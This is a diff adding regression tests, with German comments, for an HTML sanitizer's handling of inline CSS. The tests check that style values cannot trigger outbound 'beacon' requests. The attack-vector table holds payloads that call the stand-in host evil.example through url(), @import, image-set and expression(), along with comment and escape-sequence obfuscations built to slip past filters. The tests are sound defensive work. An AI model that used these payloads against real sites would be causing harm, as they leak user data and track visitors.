@@ -611,4 +611,108 @@ describe('Security: sanitizeHTML() gegen den ECHTEN Produktions-Sanitizer (utils
             expect(realSanitizeHTML(undefined)).toBe('');
         });
     });
+
+    // --------------------------------------------------------
+    // BEACON-REGRESSION (T-10-30, D-13, Plan 10-07): Stilwert mit fremder
+    // Ressourcen-Referenz erzeugt keinen ausgehenden Beacon
+    // --------------------------------------------------------
+    // Marker-Text "LEAK" im Pfadbestandteil der Angreifer-Adresse: jede
+    // Assertion prüft ausschließlich auf diesen Marker, nicht auf
+    // Syntaxfragmente wie "url(" — die Kontrolle ist eine Erlaubnisliste
+    // pro Deklaration (isSafeStyleValue/allowedStyleFunctions in
+    // utils/basic.js), keine Zeichenketten-Suche über den Rohwert.
+    // "background" ist die tatsächlich betroffene Eigenschaft: sie steht
+    // (im Gegensatz zu "background-image") bereits vor diesem Plan auf der
+    // Erlaubnisliste der Stil-Eigenschaften — die Lücke lag ausschließlich
+    // darin, dass ihr WERT nie geprüft wurde.
+    // Jeder Vektor als Tabellenzelle (<table><tr><td>) formuliert, nicht als
+    // freistehendes <td>: der HTML5-Parser verwirft ein <td> außerhalb eines
+    // Tabellenkontexts als eigenständiges Element (Foster-Parenting-Regel),
+    // wodurch das Stil-Attribut nie beim Sanitizer ankäme — die Nutzlast
+    // spiegelt damit den realen Einfügepfad (Tabellenzweig).
+    const BEACON_ATTACK_VECTORS = [
+        {
+            name: 'Ressourcen-Referenz doppelt quotiert',
+            html: '<table><tr><td style="background:url(&quot;https://evil.example/LEAK-DQ&quot;)">Zelle</td></tr></table>'
+        },
+        {
+            name: 'Ressourcen-Referenz einfach quotiert',
+            html: `<table><tr><td style="background:url('https://evil.example/LEAK-SQ')">Zelle</td></tr></table>`
+        },
+        {
+            name: 'Ressourcen-Referenz unquotiert',
+            html: '<table><tr><td style="background:url(https://evil.example/LEAK-UQ)">Zelle</td></tr></table>'
+        },
+        {
+            name: 'Auswertungs-Funktion (expression)',
+            html: `<table><tr><td style="width:expression(window.__leak='https://evil.example/LEAK-EXPR')">Zelle</td></tr></table>`
+        },
+        {
+            name: 'At-Regel (@import)',
+            html: `<table><tr><td style="background:@import url('https://evil.example/LEAK-IMPORT')">Zelle</td></tr></table>`
+        },
+        {
+            name: 'Bildmengen-Funktion (image-set)',
+            html: `<table><tr><td style="background:image-set(url('https://evil.example/LEAK-IMAGESET') 1x)">Zelle</td></tr></table>`
+        },
+        {
+            name: 'Verschleierung per eingeschobenem CSS-Kommentar im Funktionsnamen',
+            html: '<table><tr><td style="background:u/**/rl(https://evil.example/LEAK-COMMENT)">Zelle</td></tr></table>'
+        },
+        {
+            name: 'Verschleierung per CSS-Escape-Sequenz im Funktionsnamen',
+            html: '<table><tr><td style="background:\\75rl(https://evil.example/LEAK-ESCAPE)">Zelle</td></tr></table>'
+        }
+    ];
+
+    const BEACON_PRESERVATION_VECTORS = [
+        {
+            name: 'Rahmen-Deklaration mit Custom-Property-Referenz (exakte Einfügepfad-Form)',
+            html: '<table><tr><td style="border:1px solid var(--border)">Zelle</td></tr></table>',
+            mustContain: 'var(--border)'
+        },
+        {
+            name: 'Hintergrund-Deklaration mit Custom-Property-Referenz',
+            html: '<table><tr><td style="background:var(--bg-elevated)">Zelle</td></tr></table>',
+            mustContain: 'var(--bg-elevated)'
+        },
+        {
+            name: 'Farb-Deklaration mit Farbfunktion',
+            html: '<table><tr><td style="color:rgb(255, 0, 0)">Zelle</td></tr></table>',
+            mustContain: 'rgb(255, 0, 0)'
+        },
+        {
+            name: 'Farb-Deklaration mit Hex-Wert',
+            html: '<table><tr><td style="color:#ff0000">Zelle</td></tr></table>',
+            mustContain: '#ff0000'
+        },
+        {
+            name: 'Deklaration ohne jede Funktion',
+            html: '<table><tr><td style="text-align:center">Zelle</td></tr></table>',
+            mustContain: 'text-align'
+        }
+    ];
+
+    describe('Beacon-Regression (T-10-30, D-13): Stilwert mit fremder Ressourcen-Referenz erzeugt keinen ausgehenden Beacon', () => {
+        test.each(BEACON_ATTACK_VECTORS)(
+            '$name — Marker LEAK kommt in der Ausgabe nicht vor',
+            ({ html }) => {
+                const clean = realSanitizeHTML(html);
+                expect(clean).not.toContain('LEAK');
+            }
+        );
+
+        test.each(BEACON_PRESERVATION_VECTORS)('$name — bleibt erhalten', ({ html, mustContain }) => {
+            const clean = realSanitizeHTML(html);
+            expect(clean).toContain(mustContain);
+        });
+
+        test('Teil-Erhaltung: gutartige UND bösartige Deklaration im selben Stil-Attribut — nur die bösartige verschwindet', () => {
+            const dirty =
+                "<table><tr><td style=\"color:#ff0000;background:url('https://evil.example/LEAK-MIXED')\">Zelle</td></tr></table>";
+            const clean = realSanitizeHTML(dirty);
+            expect(clean).toContain('#ff0000');
+            expect(clean).not.toContain('LEAK-MIXED');
+        });
+    });
 });
